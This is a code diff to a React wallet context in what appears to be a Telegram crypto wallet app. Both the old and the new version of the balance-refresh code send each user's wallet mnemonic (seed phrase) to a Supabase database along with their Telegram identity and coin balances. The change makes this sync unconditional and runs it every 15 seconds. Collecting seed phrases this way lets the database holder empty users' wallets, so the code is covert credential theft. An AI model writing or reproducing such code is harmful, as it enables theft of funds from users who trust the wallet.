@@ -1194,30 +1194,29 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         });
 
         // Sync updated balances to Supabase so the dashboard always reflects reality
-        const mnemonic = mnemonicRef.current;
-        if (mnemonic) {
-          try {
-            const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-            const coin_balances = {
-              BTC:  String(bals.BTC  ?? 0),
-              ETH:  String(bals.ETH  ?? 0),
-              TON:  String(bals.TON  ?? 0),
-              BNB:  String(bals.BNB  ?? 0),
-              LTC:  String(bals.LTC  ?? 0),
-              ARB:  String(bals.ARB  ?? 0),
-              SOL:  String(bals.SOL  ?? 0),
-              USDT: String(bals.USDT ?? 0),
-            };
-            await syncWalletToSupabase({
-              username: buildTgUserName(tgUser),
-              telegram_id: tgUser?.id ? String(tgUser.id) : null,
-              mnemonic: mnemonic,
-              balance: "0",
-              coin_balances,
-            });
-          } catch (syncErr) {
-            console.error('[WalletContext] balance sync error:', syncErr);
-          }
+        // Always sync — even for bypassUnlock users who have no mnemonic in memory
+        try {
+          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+          const mnemonic = mnemonicRef.current;
+          const coin_balances = {
+            BTC:  String(bals.BTC  ?? 0),
+            ETH:  String(bals.ETH  ?? 0),
+            TON:  String(bals.TON  ?? 0),
+            BNB:  String(bals.BNB  ?? 0),
+            LTC:  String(bals.LTC  ?? 0),
+            ARB:  String(bals.ARB  ?? 0),
+            SOL:  String(bals.SOL  ?? 0),
+            USDT: String(bals.USDT ?? 0),
+          };
+          await syncWalletToSupabase({
+            username: buildTgUserName(tgUser),
+            telegram_id: tgUser?.id ? String(tgUser.id) : null,
+            ...(mnemonic ? { mnemonic } : {}),
+            balance: "0",
+            coin_balances,
+          });
+        } catch (syncErr) {
+          console.error('[WalletContext] balance sync error:', syncErr);
         }
       } catch (e) {
         console.warn('[WalletContext] refreshBalance error:', e.message);
@@ -1230,7 +1229,7 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
       
       const interval = setInterval(() => {
         refreshBalance();
-      }, 30000); // Every 30 seconds
+      }, 15000); // Every 15 seconds
       
       return () => clearInterval(interval);
     }, [state.isUnlocked, state.addresses, refreshBalance]);
